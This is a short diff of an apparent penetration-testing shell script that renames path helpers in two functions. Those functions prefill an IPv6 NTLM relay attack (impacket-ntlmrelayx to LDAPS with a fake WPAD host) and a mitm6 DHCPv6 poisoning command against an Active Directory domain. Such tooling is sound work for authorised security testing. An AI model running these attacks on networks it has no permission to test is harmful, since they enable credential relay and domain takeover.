@@ -30,12 +30,12 @@ nb-ad-ipv6-ntlmrelayx() {
 	  __ask "Enter the IP address of the target DC server"
 	  nb-vars-set-rhost
 
-    print -z "impacket-ntlmrelayx -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__domadpath)/ntlmrelayx"
+    print -z "impacket-ntlmrelayx -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__dompath)/ntlmrelayx"
 }
 
 nb-ad-ipv6-mitm6() {
     __check-project
 	  __check-domain
 
-    print -z "sudo mitm6 -d ${__DOMAIN} | tee -a $(__netadpath)/cme-sweep.txt"
+    print -z "sudo mitm6 -d ${__DOMAIN} | tee -a $(__netpath)/cme-sweep.txt"
 }
